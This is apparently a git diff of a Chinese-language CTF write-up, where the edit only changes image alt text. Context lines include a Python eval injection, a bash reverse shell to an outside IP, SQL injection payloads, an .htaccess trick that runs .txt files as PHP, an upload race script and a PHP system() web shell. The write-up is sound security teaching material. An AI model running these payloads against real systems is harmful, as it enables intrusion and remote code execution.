@@ -25,7 +25,7 @@ eval(input("What is the number?: "))
 __import__('os').system("dir")
 ```
 
-![1](./assets/001.jpg)
+![image](./assets/001.jpg)
 
 但是并不知道环境是否出网，而且也不知道远程是否可行
 
@@ -39,7 +39,7 @@ exit()
 __import__('os').system("/bin/bash -c 'bash -i >& /dev/tcp/156.238.233.93/4444 0>&1'")
 ```
 
-![1](./assets/002.jpg)
+![image](./assets/002.jpg)
 
 现在尝试题目看看是否可行呢，不可行(`exit()`也失败了)，但是但是，在第二天，我又發現可以了
 
@@ -176,7 +176,7 @@ app.listen(port, () => {
 
 写了两个异步函数在这里，抓包发现也确实是这样的
 
-![1](./assets/003.jpg)
+![image](./assets/003.jpg)
 
 然后看到WEB应用代码，是个很明显的sql注入
 
@@ -275,9 +275,9 @@ select/**/group_concat(value)from/**/Flag_REDACTED
 
 但是题目不一样，并且因为是http2，
 
-![1](./assets/004.jpg)
+![image](./assets/004.jpg)
 
-![1](./assets/005.jpg)
+![image](./assets/005.jpg)
 
 必须用hackbar
 
@@ -291,9 +291,9 @@ select/**/group_concat(value)from/**/Flag_843423739
 
 现在是要查内部注释的flag了，问gpt(我不如AI)
 
-![1](./assets/006.jpg)
+![image](./assets/006.jpg)
 
-![1](./assets/007.jpg)
+![image](./assets/007.jpg)
 
 ```sql
 SELECT/**/query/**/FROM/**/information_schema.processlist/**/WHERE/**/id=connection_id()
@@ -362,11 +362,11 @@ if (!is_dir($target_dir)) {
 ?>
 ```
 
-![1](./assets/008.jpg)
+![image](./assets/008.jpg)
 
 这里是根据最后的一个点来判断后缀的，并且要求文件为txt文件，直接一个后缀问题就绕过了上传了但是
 
-![1](./assets/009.jpg)
+![image](./assets/009.jpg)
 
 这样子会把权限降低为0，单看代码我没看出什么，所以来进到docker里面来慢慢考量
 
@@ -376,11 +376,11 @@ docker exec -it 8a420fb7554e /bin/bash
 
 虽然我可以直接拿到`get_flag`这个文件，但是其中并不含有flag，他仅仅是一个二进制文件
 
-![1](./assets/010.jpg)
+![image](./assets/010.jpg)
 
 还是要getshell，上传了一个文件上去，发现确实想代码一般
 
-![1](./assets/011.jpg)
+![image](./assets/011.jpg)
 
 没有足够的权限，仔细想了想，文件上传getshell应该是不太可能了，但是他这里有个危险函数，想办法看看这里能不能命令执行
 
@@ -405,7 +405,7 @@ php_value auto_prepend_file "./shell.php.txt"
 AddType application/x-httpd-php .txt
 ```
 
-![1](./assets/012.jpg)
+![image](./assets/012.jpg)
 
 
 
@@ -486,7 +486,7 @@ Submit Art
 
 ```
 
-![1](./assets/013.jpg)
+![image](./assets/013.jpg)
 
 进antsword的虚拟终端就可以拿到flag了
 
@@ -534,7 +534,7 @@ threading.Thread(target=upload_shell).start()
 get_shell()
 ```
 
-![1](./assets/014.jpg)
+![image](./assets/014.jpg)
 
 ```
 <?php system('cd ../../;./get_flag'); ?>
